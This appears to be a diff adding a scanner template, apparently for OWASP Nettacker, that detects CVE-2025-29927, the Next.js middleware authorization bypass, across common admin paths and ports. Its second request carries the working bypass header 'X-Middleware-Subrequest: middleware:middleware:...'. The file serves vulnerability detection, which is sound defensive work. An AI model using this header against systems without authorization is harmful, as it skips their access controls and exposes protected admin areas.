@@ -1,0 +1,102 @@
+info:
+  name: nextjs_cve_2025_29927_vuln
+  author: Syed Suzain
+  severity: 9
+  description: |
+    CVE-2025-29927 is a critical authorization bypass vulnerability in Next.js (CVSS 9.1). It allows an unauthenticated attacker to completely skip the authorization checks implemented in a Next.js application's middleware simply by adding a crafted HTTP header to a request.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+    - https://nextjs.org/blog/cve-2025-29927
+    - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve2025
+    - cve
+    - nextjs
+    - cisa_kev
+    - auth_bypass
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        allow_redirects: false
+        headers:
+          User-Agent: "{user_agent}"
+          X-Nextjs-Data: "1"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                - "admin"
+                - "administrator"
+                - "login"
+                - "api/admin"
+                - "api/user"
+                - "admin/login"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 3000
+                - 8080
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '^(307|302)$'
+              reverse: false
+            headers:
+              Location:
+                regex: '(?i)(login|signin|auth|authenticate|unauthorized|admin|dashboard|forbidden)'
+                reverse: false
+
+      - method: get
+        timeout: 5
+        allow_redirects: false
+        headers:
+          User-Agent: "{user_agent}"
+          X-Nextjs-Data: "1"
+          X-Middleware-Subrequest: "middleware:middleware:middleware:middleware:middleware"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                - "admin"
+                - "administrator"
+                - "login"
+                - "api/admin"
+                - "api/user"
+                - "admin/login"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 3000
+                - 8080
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '^200$'
+              reverse: false
+            content:
+              regex: '(__NEXT_DATA__|_next/static|next/dist)'
+              reverse: false
